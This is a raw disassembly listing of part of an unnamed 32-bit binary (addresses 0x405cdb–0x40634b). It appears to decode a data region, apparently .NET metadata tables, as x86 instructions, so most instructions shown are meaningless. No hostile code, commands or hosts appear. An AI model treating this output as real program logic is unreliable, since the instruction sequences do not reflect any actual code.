  405cdb:	00 b7 06 3d 15 06    	add    %dh,0x6153d06(%edi)
  405ce1:	00 30                	add    %dh,(%eax)
  405ce3:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
  405ce7:	00 d5                	add    %dl,%ch
  405ce9:	06                   	push   %es
  405cea:	3d 15 06 00 62       	cmp    $0x62000615,%eax
  405cef:	1d 55 00 16 00       	sbb    $0x160055,%eax
  405cf4:	ff 16                	call   *(%esi)
  405cf6:	dc 02                	faddl  (%edx)
  405cf8:	06                   	push   %es
  405cf9:	00 31                	add    %dh,(%ecx)
  405cfb:	0e                   	push   %cs
  405cfc:	55                   	push   %ebp
  405cfd:	00 06                	add    %al,(%esi)
  405cff:	00 6c 06 5c          	add    %ch,0x5c(%esi,%eax,1)
  405d03:	02 06                	add    (%esi),%al
  405d05:	00 70 0f             	add    %dh,0xf(%eax)
  405d08:	5c                   	pop    %esp
  405d09:	02 06                	add    (%esi),%al
  405d0b:	00 02                	add    %al,(%edx)
  405d0d:	05 5c 02 06 00       	add    $0x6025c,%eax
  405d12:	77 14                	ja     0x405d28
  405d14:	5c                   	pop    %esp
  405d15:	02 06                	add    (%esi),%al
  405d17:	00 26                	add    %ah,(%esi)
  405d19:	12 5c 02 16          	adc    0x16(%edx,%eax,1),%bl
  405d1d:	00 3f                	add    %bh,(%edi)
  405d1f:	12 5e 15             	adc    0x15(%esi),%bl
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	f6 13                	notb   (%ebx)
  405d26:	7f 1a                	jg     0x405d42
  405d28:	1a 00                	sbb    (%eax),%al
  405d2a:	7b 11                	jnp    0x405d3d
  405d2c:	7f 1a                	jg     0x405d48
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	af                   	scas   %es:(%edi),%eax
  405d31:	14 00                	adc    $0x0,%al
  405d33:	00 1a                	add    %bl,(%edx)
  405d35:	00 1b                	add    %bl,(%ebx)
  405d37:	19 7f 1a             	sbb    %edi,0x1a(%edi)
  405d3a:	06                   	push   %es
  405d3b:	00 36                	add    %dh,(%esi)
  405d3d:	15 ee 0f 06 00       	adc    $0x60fee,%eax
  405d42:	7a 00                	jp     0x405d44
  405d44:	ee                   	out    %al,(%dx)
  405d45:	0f 06                	clts
  405d47:	00 e5                	add    %ah,%ch
  405d49:	0f ee 0f             	pmaxsw (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 da                	add    %bl,%dl
  405d4f:	00 ee                	add    %ch,%dh
  405d51:	0f 06                	clts
  405d53:	00 de                	add    %bl,%dh
  405d55:	12 f8                	adc    %al,%bh
  405d57:	1c 06                	sbb    $0x6,%al
  405d59:	00 2d 10 f8 1c 06    	add    %ch,0x61cf810
  405d5f:	00 ad 07 ee 0f 06    	add    %ch,0x60fee07(%ebp)
  405d65:	00 80 10 ee 0f 1e    	add    %al,0x1e0fee10(%eax)
  405d6b:	00 24 11             	add    %ah,(%ecx,%edx,1)
  405d6e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405d6f:	17                   	pop    %ss
  405d70:	06                   	push   %es
  405d71:	00 99 1d b8 0e 06    	add    %bl,0x60eb81d(%ecx)
  405d77:	00 d2                	add    %dl,%dl
  405d79:	0e                   	push   %cs
  405d7a:	b8 0e 06 00 7a       	mov    $0x7a00060e,%eax
  405d7f:	06                   	push   %es
  405d80:	b8 0e 06 00 6f       	mov    $0x6f00060e,%eax
  405d85:	03 ee                	add    %esi,%ebp
  405d87:	0f 06                	clts
  405d89:	00 1a                	add    %bl,(%edx)
  405d8b:	06                   	push   %es
  405d8c:	98                   	cwtl
  405d8d:	0b 0a                	or     (%edx),%ecx
  405d8f:	00 0f                	add    %cl,(%edi)
  405d91:	14 55                	adc    $0x55,%al
  405d93:	00 0a                	add    %cl,(%edx)
  405d95:	00 93 18 55 00 06    	add    %dl,0x6005518(%ebx)
  405d9b:	00 d0                	add    %dl,%al
  405d9d:	04 55                	add    $0x55,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	ec                   	in     (%dx),%al
  405da3:	14 00                	adc    $0x0,%al
  405da5:	00 12                	add    %dl,(%edx)
  405da7:	00 9d 05 ba 12 06    	add    %bl,0x612ba05(%ebp)
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 c1                	add    %al,%cl
  405db1:	02 06                	add    (%esi),%al
  405db3:	00 b2 10 ee 0f 06    	add    %dh,0x60fee10(%edx)
  405db9:	00 15 1d 4f 11 06    	add    %dl,0x6114f1d
  405dbf:	00 39                	add    %bh,(%ecx)
  405dc1:	08 ee                	or     %ch,%dh
  405dc3:	0f 06                	clts
  405dc5:	00 f7                	add    %dh,%bh
  405dc7:	14 ee                	adc    $0xee,%al
  405dc9:	0f 06                	clts
  405dcb:	00 f6                	add    %dh,%dh
  405dcd:	05 ee 0f 22 00       	add    $0x220fee,%eax
  405dd2:	4c                   	dec    %esp
  405dd3:	12 55 13             	adc    0x13(%ebp),%dl
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	cd 16                	int    $0x16
  405dda:	55                   	push   %ebp
  405ddb:	13 22                	adc    (%edx),%esp
  405ddd:	00 7c 13 55          	add    %bh,0x55(%ebx,%edx,1)
  405de1:	13 12                	adc    (%edx),%edx
  405de3:	00 74 13 9b          	add    %dh,-0x65(%ebx,%edx,1)
  405de7:	15 22 00 e5 16       	adc    $0x16e50022,%eax
  405dec:	55                   	push   %ebp
  405ded:	13 06                	adc    (%esi),%eax
  405def:	00 55 16             	add    %dl,0x16(%ebp)
  405df2:	f8                   	clc
  405df3:	1c 06                	sbb    $0x6,%al
  405df5:	00 eb                	add    %ch,%bl
  405df7:	11 ee                	adc    %ebp,%esi
  405df9:	0f 06                	clts
  405dfb:	00 5c 16 f8          	add    %bl,-0x8(%esi,%edx,1)
  405dff:	1c 12                	sbb    $0x12,%al
  405e01:	00 10                	add    %dl,(%eax)
  405e03:	13 f8                	adc    %eax,%edi
  405e05:	1c 06                	sbb    $0x6,%al
  405e07:	00 a4 0f f8 1c 06 00 	add    %ah,0x61cf8(%edi,%ecx,1)
  405e0e:	fb                   	sti
  405e0f:	00 f8                	add    %bh,%al
  405e11:	1c 06                	sbb    $0x6,%al
  405e13:	00 d5                	add    %dl,%ch
  405e15:	11 ee                	adc    %ebp,%esi
  405e17:	0f 06                	clts
  405e19:	00 06                	add    %al,(%esi)
  405e1b:	10 f8                	adc    %bh,%al
  405e1d:	1c 06                	sbb    $0x6,%al
  405e1f:	00 47 05             	add    %al,0x5(%edi)
  405e22:	f8                   	clc
  405e23:	1c 06                	sbb    $0x6,%al
  405e25:	00 0b                	add    %cl,(%ebx)
  405e27:	05 f8 1c 06 00       	add    $0x61cf8,%eax
  405e2c:	47                   	inc    %edi
  405e2d:	10 f8                	adc    %bh,%al
  405e2f:	1c 06                	sbb    $0x6,%al
  405e31:	00 26                	add    %ah,(%esi)
  405e33:	05 f8 1c 06 00       	add    $0x61cf8,%eax
  405e38:	be 11 f8 1c 06       	mov    $0x61cf811,%esi
  405e3d:	00 9d 13 ee 0f 06    	add    %bl,0x60fee13(%ebp)
  405e43:	00 8b 1c ee 0f 06    	add    %cl,0x60fee1c(%ebx)
  405e49:	00 ff                	add    %bh,%bh
  405e4b:	17                   	pop    %ss
  405e4c:	9b                   	fwait
  405e4d:	15 06 00 d3 05       	adc    $0x5d30006,%eax
  405e52:	ee                   	out    %al,(%dx)
  405e53:	0f 06                	clts
  405e55:	00 26                	add    %ah,(%esi)
  405e57:	03 f8                	add    %eax,%edi
  405e59:	1c 06                	sbb    $0x6,%al
  405e5b:	00 c7                	add    %al,%bh
  405e5d:	00 ee                	add    %ch,%dh
  405e5f:	0f 06                	clts
  405e61:	00 c1                	add    %al,%cl
  405e63:	05 ee 0f 06 00       	add    $0x60fee,%eax
  405e68:	3f                   	aas
  405e69:	06                   	push   %es
  405e6a:	ee                   	out    %al,(%dx)
  405e6b:	0f 06                	clts
  405e6d:	00 2e                	add    %ch,(%esi)
  405e6f:	18 5c 02 06          	sbb    %bl,0x6(%edx,%eax,1)
  405e73:	00 3e                	add    %bh,(%esi)
  405e75:	08 5c 02 0a          	or     %bl,0xa(%edx,%eax,1)
  405e79:	00 b1 0f 0e 11 0a    	add    %dh,0xa110e0f(%ecx)
  405e7f:	00 37                	add    %dh,(%edi)
  405e81:	05 0e 11 00 00       	add    $0x110e,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	40                   	inc    %eax
  405e89:	01 00                	add    %eax,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 c9                	add    %cl,%cl
  405e97:	0f 78 1a             	vmread %ebx,(%edx)
  405e9a:	05 00 01 00 01       	add    $0x1000100,%eax
  405e9f:	00 81 01 10 00 11    	add    %al,0x11001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	78 1a                	js     0x405ec2
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 99    	add    %al,-0x66ffefff(%ecx)
  405eb3:	19 96 11 05 00 13    	sbb    %edx,0x13000511(%esi)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 ac 12 06 0f 05 00 	add    %ch,0x50f06(%edx,%edx,1)
  405ec6:	1e                   	push   %ds
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	31 17                	xor    %edx,(%edi)
  405ed0:	35 14 05 00 1e       	xor    $0x1e000514,%eax
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 88    	add    %al,-0x77ffefff(%ecx)
  405edd:	10 35 14 05 00 1e    	adc    %dh,0x1e000514
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 45 13             	add    %al,0x13(%ebp)
  405eec:	35 14 05 00 1e       	xor    $0x1e000514,%eax
  405ef1:	00 2f                	add    %ch,(%edi)
  405ef3:	00 81 01 10 00 56    	add    %al,0x56001001(%ecx)
  405ef9:	15 35 14 05 00       	adc    $0x51435,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 55    	add    %al,0x55001001(%ecx)
  405f07:	0f 35                	sysexit
  405f09:	14 05                	adc    $0x5,%al
  405f0b:	00 1e                	add    %bl,(%esi)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 50    	add    %al,0x50001001(%ecx)
  405f15:	15 35 14 05 00       	adc    $0x51435,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 01                	add    %al,(%ecx)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 96    	add    %al,-0x69ffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	35 14 05 00 23       	xor    $0x23000514,%eax
  405f37:	00 3e                	add    %bh,(%esi)
  405f39:	00 81 01 10 00 5f    	add    %al,0x5f001001(%ecx)
  405f3f:	1d 35 14 05 00       	sbb    $0x51435,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 92    	add    %al,-0x6dffefff(%ecx)
  405f4d:	19 74 19 05          	sbb    %esi,0x5(%ecx,%ebx,1)
  405f51:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f54:	46                   	inc    %esi
  405f55:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 0d 01 f5 0f 05    	add    %cl,0x50ff501
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f78:	f5                   	cmc
  405f79:	0f 05                	syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 58 01             	add    %bl,0x1(%eax)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 38                	add    %bh,(%eax)
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 9b 17 bf 0d 05    	add    %bl,0x50dbf17(%ebx)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 58 10             	add    %bl,0x10(%eax)
  405fb0:	bf 0d 05 00 2f       	mov    $0x2f00050d,%edi
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	65 1c bf             	gs sbb $0xbf,%al
  405fbf:	0d 05 00 31 00       	or     $0x310005,%eax
  405fc4:	63 00                	arpl   %eax,(%eax)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	da 0d bf 0d 05 00    	fimull 0x50dbf
  405fd0:	33 00                	xor    (%eax),%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	12 08                	adc    (%eax),%cl
  405fda:	bf 0d 39 00 3a       	mov    $0x3a00390d,%edi
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 86 17 bf 0d 05    	add    %al,0x50dbf17(%esi)
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 90 17 bf 0d 05    	add    %dl,0x50dbf17(%eax)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 86    	add    %al,-0x79ffefff(%ecx)
  406003:	12 bf 0d 05 00 47    	adc    0x4700050d(%edi),%bh
  406009:	00 a2 00 00 01 00    	add    %ah,0x10000(%edx)
  40600f:	00 49 01             	add    %cl,0x1(%ecx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 1b                	add    %bl,(%ebx)
  40601f:	01 00                	add    %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 a0 18 	add    %ah,0x18a00016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 ad 18 12 00 16    	add    %ch,0x16001218(%ebp)
  406035:	00 06                	add    %al,(%esi)
  406037:	11 12                	adc    %edx,(%edx)
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 0d 0f 12 00 16    	add    %cl,0x1600120f
  406041:	00 37                	add    %dh,(%edi)
  406043:	13 12                	adc    (%edx),%edx
  406045:	00 16                	add    %dl,(%esi)
  406047:	00 46 06             	add    %al,0x6(%esi)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 ef                	add    %ch,%bh
  40604f:	1c 12                	sbb    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 97 02 12 00 16    	add    %dl,0x16001202(%edi)
  406059:	00 a1 08 12 00 16    	add    %ah,0x16001208(%ecx)
  40605f:	00 54 08 12          	add    %dl,0x12(%eax,%ecx,1)
  406063:	00 16                	add    %dl,(%esi)
  406065:	00 9b 08 15 00 16    	add    %bl,0x16001508(%ebx)
  40606b:	00 a3 0d 12 00 16    	add    %ah,0x1600120d(%ebx)
  406071:	00 14 01             	add    %dl,(%ecx,%eax,1)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 ce                	add    %cl,%dh
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 6b 02             	add    %ch,0x2(%ebx)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 74 03 12          	add    %dh,0x12(%ebx,%eax,1)
  406087:	00 16                	add    %dl,(%esi)
  406089:	00 44 1c 12          	add    %al,0x12(%esp,%ebx,1)
  40608d:	00 16                	add    %dl,(%esi)
  40608f:	00 a6 12 12 00 11    	add    %ah,0x11001212(%esi)
  406095:	00 80 04 21 00 11    	add    %al,0x11002104(%eax)
  40609b:	00 65 04             	add    %ah,0x4(%ebp)
  40609e:	25 00 11 00 35       	and    $0x35001100,%eax
  4060a3:	04 29                	add    $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 cb                	add    %cl,%bl
  4060a9:	03 2d 00 11 00 4d    	add    0x4d001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 b0 03 30 00 11    	add    %dh,0x11003003(%eax)
  4060b9:	00 93 03 34 00 31    	add    %dl,0x31003403(%ebx)
  4060bf:	00 79 03             	add    %bh,0x3(%ecx)
  4060c2:	37                   	aaa
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 e7                	add    %ah,%bh
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 1b                	add    %bl,(%ebx)
  4060cd:	04 3a                	add    $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 fd                	add    %bh,%ch
  4060d3:	03 34 00             	add    (%eax,%eax,1),%esi
  4060d6:	16                   	push   %ss
  4060d7:	00 8a 12 dc 00 06    	add    %cl,0x600dc12(%edx)
  4060dd:	06                   	push   %es
  4060de:	9b                   	fwait
  4060df:	02 06                	add    (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	70 02                	jo     0x4060e8
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 ce 01             	or     $0x1,%dh
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060f6:	fe 01                	incb   (%ecx)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 4f 17             	add    %cl,0x17(%edi)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 95 0d 3a 00 51 80 	adcb   $0x80,0x51003a0d(%ebp)
  40610e:	91                   	xchg   %eax,%ecx
  40610f:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406114:	88 0d 3a 00 51 80    	mov    %cl,0x8051003a
  40611a:	6c                   	insb   (%dx),%es:(%edi)
  40611b:	0d 3a 00 21 00       	or     $0x21003a,%eax
  406120:	f3 1c 29             	repz sbb $0x29,%al
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 d4                	add    %dl,%ah
  406127:	1c 29                	sbb    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 f4                	add    %dh,%ah
  40612d:	19 29                	sbb    %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 77 01             	add    %esi,0x1(%edi)
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	5d                   	pop    %ebp
  406139:	05 8f 01 01 00       	add    $0x1018f,%eax
  40613e:	94                   	xchg   %eax,%esp
  40613f:	10 30                	adc    %dh,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 b5 11 3a 00 01    	add    %dh,0x1003a11(%ebp)
  406149:	00 94 10 30 01 01 00 	add    %dl,0x10130(%eax,%edx,1)
  406150:	2f                   	das
  406151:	14 c7                	adc    $0xc7,%al
  406153:	01 01                	add    %eax,(%ecx)
  406155:	00 a8 07 12 00 01    	add    %ch,0x1001207(%eax)
  40615b:	00 88 07 12 00 01    	add    %cl,0x1001207(%eax)
  406161:	00 aa 0a 37 00 01    	add    %ch,0x100370a(%edx)
  406167:	00 08                	add    %cl,(%eax)
  406169:	08 02                	or     %al,(%edx)
  40616b:	02 01                	add    (%ecx),%al
  40616d:	00 9d 1a c7 01 01    	add    %bl,0x101c71a(%ebp)
  406173:	00 94 10 30 01 01 00 	add    %dl,0x10130(%eax,%edx,1)
  40617a:	86 1c 06             	xchg   %bl,(%esi,%eax,1)
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	9b                   	fwait
  406181:	02 3a                	add    (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	fd                   	std
  406187:	11 02                	adc    %eax,(%edx)
  406189:	02 56 80             	add    -0x80(%esi),%dl
  40618c:	50                   	push   %eax
  40618d:	0f 02 02             	lar    (%edx),%eax
  406190:	56                   	push   %esi
  406191:	80 75 12 02          	xorb   $0x2,0x12(%ebp)
  406195:	02 56 80             	add    -0x80(%esi),%dl
  406198:	8b 1c 02             	mov    (%edx,%eax,1),%ebx
  40619b:	02 56 80             	add    -0x80(%esi),%dl
  40619e:	c3                   	ret
  40619f:	0c 02                	or     $0x2,%al
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	df 13                	fists  (%ebx)
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 00             	add    $0x0,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 80 10 02 02 56 80 	addb   $0x80,0x56020210(%eax)
  4061b6:	0a 19                	or     (%ecx),%bl
  4061b8:	02 02                	add    (%edx),%al
  4061ba:	56                   	push   %esi
  4061bb:	80 3f 06             	cmpb   $0x6,(%edi)
  4061be:	02 02                	add    (%edx),%al
  4061c0:	56                   	push   %esi
  4061c1:	80 ad 07 02 02 56 80 	subb   $0x80,0x56020207(%ebp)
  4061c8:	44                   	inc    %esp
  4061c9:	1d 02 02 33 01       	sbb    $0x1330202,%eax
  4061ce:	11 02                	adc    %eax,(%edx)
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 9d 10 0a 00 01    	add    %bl,0x1000a10(%ebp)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	01 15 0e 00 01 00    	add    %edx,0x1000e
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 07                	add    %al,(%edi)
  4061f7:	17                   	pop    %ss
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 37 0d 1d    	add    %dl,0x1d0d3700(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 07 15 0a    	add    %dl,0xa150718(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 4e 1a 3d    	add    %dl,0x3d1a4e08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 5c 1a 42    	add    %dl,0x421a5c08(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 32 1a 48    	add    %dl,0x481a3208(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 40 1a 4d    	add    %dl,0x4d1a4008(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 8e 13 53    	add    %dl,0x53138e08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 99 13 58    	add    %dl,0x58139908(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 16 0b 5e    	add    %dl,0x5e0b1608(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 25 0b 62 00 04    	or     %ah,0x400620b
  406287:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  40628e:	91                   	xchg   %eax,%ecx
  40628f:	08 cb                	or     %cl,%bl
  406291:	19 5e 00             	sbb    %ebx,0x0(%esi)
  406294:	05 00 c3 20 00       	add    $0x20c300,%eax
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 d6 19 62    	add    %dl,0x6219d608(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 cd 0a 67    	add    %dl,0x670acd08(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 db 0a 6c    	add    %dl,0x6c0adb08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 42 03 1d    	add    %dl,0x1d034208(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 52 03 72    	add    %dl,0x72035208(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 f2 02 77    	add    %dl,0x7702f208(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 86 0b 67    	add    %dl,0x670b8608(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 8f 0b 6c    	add    %dl,0x6c0b8f08(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 ec 0e 7b    	add    %dl,0x7b0eec08(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 f9 0e 7f    	add    %dl,0x7f0ef908(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 e3 0c 1d    	add    %dl,0x1d0ce308(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 f4 0c 72    	add    %dl,0x720cf408(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 21 1a 0a    	add    %dl,0xa1a2100(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
